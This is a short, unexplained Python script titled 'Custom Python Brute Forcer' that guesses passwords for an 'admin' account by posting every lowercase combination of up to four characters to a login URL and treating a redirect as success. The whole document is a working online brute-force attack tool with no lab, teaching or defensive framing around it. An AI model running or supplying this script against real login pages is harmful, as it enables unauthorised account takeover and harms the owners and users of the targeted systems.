CUSTOM PYTHON BRUTE FORCER
----------------------------

    import requests
    from itertools import product
    import string

    def brute_force_login(url, username, charset, max_len):
        for length in range(1, max_len + 1):
            for combo in product(charset, repeat=length):
                password = ''.join(combo)
                r = requests.post(url,
                    data={'username': username, 'password': password},
                    allow_redirects=False)
                if r.status_code == 302:  # redirect = success
                    print(f"[+] Password found: {password}")
                    return password
                print(f"[-] Trying: {password}", end='\r')
        return None

    brute_force_login("http://target.com/login", "admin",
                      string.ascii_lowercase, 4)


